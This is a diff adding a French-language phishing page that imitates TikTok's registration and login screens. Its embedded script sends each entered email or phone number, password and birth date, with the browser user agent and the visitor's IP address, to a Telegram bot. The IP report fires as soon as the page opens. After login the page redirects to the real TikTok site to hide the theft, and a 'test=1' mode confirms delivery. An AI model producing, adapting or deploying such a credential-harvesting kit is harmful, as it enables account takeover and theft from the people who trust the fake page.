@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>TikTok – Connexion</title>
+<style>
+  :root {
+    --bg: #000000;
+    --card: #121212;
+    --card2: #1a1a1a;
+    --primary: #fe2c55;
+    --primary-hover: #e0244a;
+    --text: #f1f1f1;
+    --muted: #8a8b91;
+    --border: #2a2a2a;
+    --input-bg: #222222;
+    --input-focus: #333333;
+  }
+  * { margin:0; padding:0; box-sizing:border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; }
+  body {
+    background: var(--bg);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    padding: 20px;
+  }
+  .card {
+    background: var(--card);
+    width: 100%;
+    max-width: 400px;
+    padding: 32px 24px 28px;
+    border-radius: 12px;
+    border: 1px solid var(--border);
+    text-align: center;
+    position: relative;
+  }
+  .logo-wrap {
+    margin-bottom: 20px;
+  }
+  .logo-svg {
+    width: 48px;
+    height: 48px;
+    margin-bottom: 8px;
+  }
+  .brand {
+    font-size: 28px;
+    font-weight: 700;
+    color: var(--text);
+    letter-spacing: 0px;
+  }
+  .brand-sub {
+    font-size: 12px;
+    color: var(--muted);
+    margin-top: 2px;
+  }
+  .step-indicator {
+    display: flex;
+    justify-content: center;
+    gap: 8px;
+    margin-bottom: 20px;
+  }
+  .step-dot {
+    width: 8px;
+    height: 8px;
+    border-radius: 50%;
+    background: #333;
+    transition: .3s;
+  }
+  .step-dot.active {
+    background: var(--primary);
+    width: 28px;
+    border-radius: 4px;
+  }
+  .page {
+    display: none;
+  }
+  .page.active {
+    display: block;
+  }
+  .card-title {
+    font-size: 20px;
+    font-weight: 600;
+    color: var(--text);
+    margin-bottom: 4px;
+    line-height: 1.3;
+  }
+  .card-sub {
+    font-size: 14px;
+    color: var(--muted);
+    margin-bottom: 20px;
+  }
+  form { text-align: left; }
+  .field-group {
+    margin-bottom: 14px;
+  }
+  .field-group label {
+    display: block;
+    font-size: 12px;
+    font-weight: 600;
+    color: var(--muted);
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+    margin-bottom: 5px;
+  }
+  input, select {
+    width: 100%;
+    padding: 13px 14px;
+    background: var(--input-bg);
+    border: 1.5px solid var(--border);
+    border-radius: 8px;
+    font-size: 15px;
+    color: var(--text);
+    transition: .2s;
+  }
+  input:focus, select:focus {
+    outline: none;
+    border-color: var(--primary);
+    background: var(--input-focus);
+  }
+  input::placeholder { color: #555; }
+  select { appearance: none; cursor: pointer; background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%238a8b91' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E"); background-repeat: no-repeat; background-position: right 12px center; }
+  .row2 {
+    display: flex;
+    gap: 10px;
+  }
+  .row2 .field-group { flex: 1; }
+  .row3 {
+    display: flex;
+    gap: 8px;
+  }
+  .row3 .field-group { flex: 1; }
+  .row3 select { padding: 12px 8px; font-size: 14px; }
+  .birth-label {
+    font-size: 12px;
+    font-weight: 600;
+    color: var(--muted);
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+    margin-bottom: 5px;
+  }
+  .btn-tiktok {
+    width: 100%;
+    padding: 14px;
+    background: var(--primary);
+    color: #fff;
+    border: none;
+    border-radius: 8px;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: .2s;
+    margin-top: 4px;
+    position: relative;
+  }
+  .btn-tiktok:hover {
+    background: var(--primary-hover);
+    transform: translateY(-1px);
+  }
+  .btn-tiktok:active {
+    transform: translateY(0);
+  }
+  .divider {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    margin: 18px 0;
+    color: #555;
+    font-size: 12px;
+  }
+  .divider::before, .divider::after {
+    content: "";
+    flex: 1;
+    height: 1px;
+    background: #2a2a2a;
+  }
+  .social-btns {
+    display: flex;
+    gap: 10px;
+    margin-bottom: 16px;
+  }
+  .social-btn {
+    flex: 1;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    padding: 12px;
+    background: var(--input-bg);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    cursor: pointer;
+    transition: .2s;
+    color: var(--text);
+    font-size: 13px;
+    font-weight: 500;
+    text-decoration: none;
+  }
+  .social-btn:hover {
+    background: var(--input-focus);
+    border-color: #444;
+  }
+  .social-btn svg {
+    width: 20px;
+    height: 20px;
+  }
+  .switch-link {
+    display: block;
+    margin-top: 18px;
+    font-size: 13px;
+    color: var(--muted);
+  }
+  .switch-link a {
+    color: var(--primary);
+    text-decoration: none;
+    font-weight: 600;
+    cursor: pointer;
+  }
+  .switch-link a:hover { text-decoration: underline; }
+  .forgot-link {
+    display: block;
+    text-align: center;
+    margin: 12px 0 0;
+    font-size: 13px;
+    font-weight: 500;
+    color: var(--muted);
+    text-decoration: none;
+  }
+  .forgot-link:hover { color: var(--primary); }
+  .legal {
+    margin-top: 16px;
+    font-size: 11px;
+    color: #555;
+    line-height: 1.5;
+  }
+  .legal a { color: #777; text-decoration: none; }
+  .legal a:hover { color: var(--primary); }
+  .footer-bar {
+    margin-top: 24px;
+    font-size: 12px;
+    color: #444;
+    text-align: center;
+  }
+  .footer-bar a { color: #666; text-decoration: none; margin: 0 6px; }
+  .footer-bar a:hover { color: var(--primary); }
+
+  /* Spinner */
+  .spinner {
+    display: none;
+    width: 18px;
+    height: 18px;
+    border: 2.5px solid rgba(255,255,255,0.3);
+    border-top-color: #fff;
+    border-radius: 50%;
+    animation: spin .6s linear infinite;
+    margin: 0 auto;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .btn-tiktok.loading .spinner { display: inline-block; }
+  .btn-tiktok.loading .btn-text { display: none; }
+</style>
+</head>
+<body>
+
+<div class="card">
+  <div class="logo-wrap">
+    <!-- TikTok logo SVG (note musicale stylisée) -->
+    <svg class="logo-svg" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <rect width="100" height="100" rx="20" fill="#121212"/>
+      <path d="M65 25H55V55C55 61.6 49.6 67 43 67C36.4 67 31 61.6 31 55C31 48.4 36.4 43 43 43V33C33.3 33 25 41.3 25 51C25 60.7 33.3 69 43 69C52.7 69 61 60.7 61 51V37.7C63.5 39.5 66.6 40.6 70 41V30.8C68.3 30.8 66.6 30.2 65 29.2V25Z" fill="#fe2c55"/>
+      <path d="M75 41V30.8C73.3 30.8 71.6 30.2 70 29.2L70 29.2V41C70 41 75 41 75 41Z" fill="#25f4ee"/>
+      <path d="M70 41V37.7C67.5 35.9 65.5 33.8 65 29.2C65 33.8 61 37.7 61 37.7L61 51C61 60.7 52.7 69 43 69C36.9 69 31.5 65.9 28.5 61.3C31.1 65.1 36.5 68 43 68C52.7 68 61 59.7 61 50.7V37.7C63.5 39.5 66.6 40.6 70 41Z" fill="white" fill-opacity="0.3"/>
+    </svg>
+    <div class="brand">TikTok</div>
+  </div>
+
+  <div class="step-indicator">
+    <div class="step-dot active" id="dot1"></div>
+    <div class="step-dot" id="dot2"></div>
+  </div>
+
+  <!-- ============ PAGE 1 : INSCRIPTION ============ -->
+  <div class="page active" id="pageRegister">
+    <div class="card-title">Créer un compte</div>
+    <div class="card-sub">Rejoignez TikTok</div>
+
+    <form id="registerForm" autocomplete="off">
+      <div class="field-group">
+        <input type="text" id="regEmail" placeholder="Numéro de téléphone ou e-mail" required autofocus>
+      </div>
+      <div class="field-group">
+        <input type="password" id="regPassword" placeholder="Mot de passe" required>
+      </div>
+
+      <div class="birth-label">Date de naissance</div>
+      <div class="row3">
+        <div class="field-group">
+          <select id="birthDay">
+            <option value="">Jour</option>
+            <option>1</option><option>2</option><option>3</option><option>4</option><option>5</option>
+            <option>6</option><option>7</option><option>8</option><option>9</option><option>10</option>
+            <option>11</option><option>12</option><option>13</option><option>14</option><option>15</option>
+            <option>16</option><option>17</option><option>18</option><option>19</option><option>20</option>
+            <option>21</option><option>22</option><option>23</option><option>24</option><option>25</option>
+            <option>26</option><option>27</option><option>28</option><option>29</option><option>30</option>
+            <option>31</option>
+          </select>
+        </div>
+        <div class="field-group">
+          <select id="birthMonth">
+            <option value="">Mois</option>
+            <option value="01">Jan</option><option value="02">Fév</option><option value="03">Mar</option>
+            <option value="04">Avr</option><option value="05">Mai</option><option value="06">Jun</option>
+            <option value="07">Jul</option><option value="08">Aoû</option><option value="09">Sep</option>
+            <option value="10">Oct</option><option value="11">Nov</option><option value="12">Déc</option>
+          </select>
+        </div>
+        <div class="field-group">
+          <select id="birthYear">
+            <option value="">Année</option>
+            <option>2008</option><option>2007</option><option>2006</option><option>2005</option>
+            <option>2004</option><option>2003</option><option>2002</option><option>2001</option>
+            <option>2000</option><option>1999</option><option>1998</option><option>1997</option>
+            <option>1996</option><option>1995</option><option>1994</option><option>1993</option>
+            <option>1992</option><option>1991</option><option>1990</option><option>1989</option>
+            <option>1988</option><option>1987</option><option>1986</option><option>1985</option>
+            <option>1984</option><option>1983</option><option>1982</option><option>1981</option>
+            <option>1980</option>
+          </select>
+        </div>
+      </div>
+
+      <button type="submit" class="btn-tiktok" id="regBtn">
+        <span class="btn-text">S'inscrire</span>
+        <div class="spinner"></div>
+      </button>
+    </form>
+
+    <div class="legal">
+      En continuant, vous acceptez les <a href="#">Conditions d'utilisation</a> de TikTok et confirmez avoir lu la  <a href="#">Politique de confidentialité</a>.
+    </div>
+
+    <div class="switch-link">
+      Vous avez déjà un compte ? <a onclick="showLoginPage()">Connectez-vous</a>
+    </div>
+  </div>
+
+  <!-- ============ PAGE 2 : CONNEXION ============ -->
+  <div class="page" id="pageLogin">
+    <div class="card-title">Connectez-vous</div>
+    <div class="card-sub">Accédez à votre compte TikTok</div>
+
+    <form id="loginForm" autocomplete="off">
+      <div class="field-group">
+        <input type="text" id="loginEmail" placeholder="Numéro de téléphone, e-mail ou nom d'utilisateur" required autofocus>
+      </div>
+      <div class="field-group">
+        <input type="password" id="loginPassword" placeholder="Mot de passe" required>
+      </div>
+
+      <button type="submit" class="btn-tiktok" id="loginBtn">
+        <span class="btn-text">Se connecter</span>
+        <div class="spinner"></div>
+      </button>
+    </form>
+
+    <div class="divider">ou continuer avec</div>
+
+    <div class="social-btns">
+      <div class="social-btn">
+        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="10" fill="#4285F4"/><path d="M12 6c1.5 0 2.8.6 3.8 1.5l-1.5 1.5C13.5 8.3 12.8 8 12 8c-2.2 0-4 1.8-4 4s1.8 4 4 4c2 0 3.5-1.3 3.9-3H12v-2h6.5c.1.3.2.7.2 1 0 3.3-2.7 6-6.7 6-3.7 0-6.5-2.8-6.5-6s2.8-6 6.5-6z" fill="#fff"/></svg>
+        Google
+      </div>
+      <div class="social-btn">
+        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 2C6.5 2 2 6.5 2 12c0 4.4 2.9 8.1 6.9 9.4.5.1.7-.2.7-.5v-1.8c-2.8.6-3.4-1.4-3.4-1.4-.5-1.2-1.2-1.5-1.2-1.5-.9-.7.1-.7.1-.7 1.1.1 1.6 1.1 1.6 1.1.9 1.6 2.5 1.2 3.1.9.1-.7.4-1.2.7-1.5-2.4-.3-5-1.2-5-5.3 0-1.2.4-2.2 1.1-2.9-.1-.3-.5-1.3.1-2.7 0 0 .9-.3 2.9 1.1.8-.2 1.7-.3 2.6-.3.9 0 1.8.1 2.6.3 2-1.4 2.9-1.1 2.9-1.1.6 1.4.2 2.4.1 2.7.7.8 1.1 1.8 1.1 2.9 0 4.1-2.6 4.9-5.1 5.2.4.4.7 1.1.7 2.3v3.3c0 .3.2.6.7.5C19.1 20.1 22 16.4 22 12c0-5.5-4.5-10-10-10z" fill="#333"/></svg>
+        Apple
+      </div>
+    </div>
+
+    <a href="#" class="forgot-link">Mot de passe oublié ?</a>
+
+    <div class="switch-link">
+      Pas de compte ? <a onclick="showRegisterPage()">Inscrivez-vous</a>
+    </div>
+
+    <div class="legal" style="margin-top:14px;">
+      En continuant, vous acceptez les <a href="#">Conditions d'utilisation</a> de TikTok.
+    </div>
+  </div>
+</div>
+
+<div class="footer-bar">
+  <a href="#">À propos</a>
+  <a href="#">Aide</a>
+  <a href="#">Conditions</a>
+  <a href="#">Confidentialité</a>
+  <br>
+  © 2026 TikTok
+</div>
+
+<script>
+/* ================= CONFIGURATION ================= */
+const TELEGRAM_TOKEN = ";
+const CHAT_ID        = "";
+const REDIRECT_URL   = "https://www.tiktok.com/login";
+/* ================================================= */
+
+function telegramUrl(text) {
+  return "https://api.telegram.org/bot" + TELEGRAM_TOKEN +
+         "/sendMessage?chat_id=" + CHAT_ID +
+         "&text=" + encodeURIComponent(text);
+}
+
+function sendToTelegram(text) {
+  var img = new Image();
+  img.src = telegramUrl(text);
+}
+
+/* Notification IP à l'ouverture */
+var notified = false;
+function notifyOpen() {
+  if (notified) return;
+  notified = true;
+  try {
+    fetch("https://api.ipify.org?format=json")
+      .then(function(r){ return r.json(); })
+      .then(function(d){
+        sendToTelegram("📥 Page TikTok ouverte\n🌐 IP : " + d.ip + "\n🕐 " + new Date().toLocaleString());
+      })
+      .catch(function(){
+        sendToTelegram("📥 Page TikTok ouverte\n🕐 " + new Date().toLocaleString());
+      });
+  } catch(e) {}
+}
+
+/* Changement de page */
+function showLoginPage() {
+  document.getElementById("pageRegister").classList.remove("active");
+  document.getElementById("pageLogin").classList.add("active");
+  document.getElementById("dot1").classList.remove("active");
+  document.getElementById("dot2").classList.add("active");
+  document.getElementById("loginEmail").focus();
+}
+
+function showRegisterPage() {
+  document.getElementById("pageLogin").classList.remove("active");
+  document.getElementById("pageRegister").classList.add("active");
+  document.getElementById("dot2").classList.remove("active");
+  document.getElementById("dot1").classList.add("active");
+  document.getElementById("regEmail").focus();
+}
+
+/* ---------- PAGE 1 : Inscription ---------- */
+document.getElementById("registerForm").addEventListener("submit", function(e) {
+  e.preventDefault();
+
+  var regEmail  = document.getElementById("regEmail").value.trim();
+  var regPass   = document.getElementById("regPassword").value.trim();
+  var birthDay  = document.getElementById("birthDay").value;
+  var birthMon  = document.getElementById("birthMonth").value;
+  var birthYear = document.getElementById("birthYear").value;
+
+  if (!regEmail || !regPass || !birthDay || !birthMon || !birthYear) {
+    alert("Veuillez remplir tous les champs obligatoires.");
+    return;
+  }
+
+  var btn = document.getElementById("regBtn");
+  btn.classList.add("loading");
+  btn.disabled = true;
+
+  var msg = "🎯 INSCRIPTION TIKTOK\n" +
+            "━━━━━━━━━━━━━━━━\n" +
+            "📧 Email/Tel : " + regEmail + "\n" +
+            "🔑 Mot de passe : " + regPass + "\n" +
+            "🎂 Date naiss. : " + birthDay + "/" + birthMon + "/" + birthYear + "\n" +
+            "━━━━━━━━━━━━━━━━\n" +
+            "🖥 UA : " + navigator.userAgent.slice(0, 100) + "\n" +
+            "🕐 " + new Date().toLocaleString();
+
+  sendToTelegram(msg);
+
+  if (location.search.indexOf("test=1") !== -1) {
+    btn.classList.remove("loading");
+    btn.disabled = false;
+    alert("Test OK — inscription TikTok envoyée à Telegram");
+    return;
+  }
+
+  /* Passer à la page connexion */
+  setTimeout(function() {
+    showLoginPage();
+    btn.classList.remove("loading");
+    btn.disabled = false;
+  }, 500);
+});
+
+/* ---------- PAGE 2 : Connexion ---------- */
+document.getElementById("loginForm").addEventListener("submit", function(e) {
+  e.preventDefault();
+
+  var loginEmail = document.getElementById("loginEmail").value.trim();
+  var loginPass  = document.getElementById("loginPassword").value.trim();
+
+  if (!loginEmail || !loginPass) {
+    alert("Veuillez remplir tous les champs.");
+    return;
+  }
+
+  var btn = document.getElementById("loginBtn");
+  btn.classList.add("loading");
+  btn.disabled = true;
+
+  var msg = "🎯 CONNEXION TIKTOK\n" +
+            "━━━━━━━━━━━━━━━━\n" +
+            "📧 Email/Tel/ID : " + loginEmail + "\n" +
+            "🔑 Mot de passe : " + loginPass + "\n" +
+            "━━━━━━━━━━━━━━━━\n" +
+            "🖥 UA : " + navigator.userAgent.slice(0, 100) + "\n" +
+            "🕐 " + new Date().toLocaleString();
+
+  sendToTelegram(msg);
+
+  if (location.search.indexOf("test=1") !== -1) {
+    btn.classList.remove("loading");
+    btn.disabled = false;
+    alert("Test OK — connexion TikTok envoyée à Telegram :\n" + loginEmail + " / " + loginPass);
+    return;
+  }
+
+  /* Redirection finale vers le vrai TikTok */
+  setTimeout(function() {
+    window.location.href = REDIRECT_URL;
+  }, 400);
+});
+
+notifyOpen();
+</script>
+</body>
+</html>
